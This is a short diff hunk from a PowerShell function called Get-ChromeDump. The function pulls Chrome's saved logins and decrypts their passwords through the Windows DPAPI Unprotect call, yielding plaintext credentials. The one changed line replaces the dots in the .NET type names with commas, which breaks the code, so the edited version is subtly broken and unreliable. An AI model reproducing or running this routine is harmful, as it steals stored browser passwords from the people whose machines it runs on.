@@ -135,7 +135,7 @@ Function Get-ChromeDump{
         $action_url = $_.action_url
         $origin_url = $_.origin_url
         $scheme = $scheme_enum[[int]$_.scheme]
-        $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+        $decryptedBytes = [Security,Cryptography,ProtectedData]::Unprotect($encryptedBytes, $null, [Security,Cryptography,DataProtectionScope]::CurrentUser)
         $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
         $login = New-Object PSObject -Property @{
           ORIGIN_URL = $origin_url
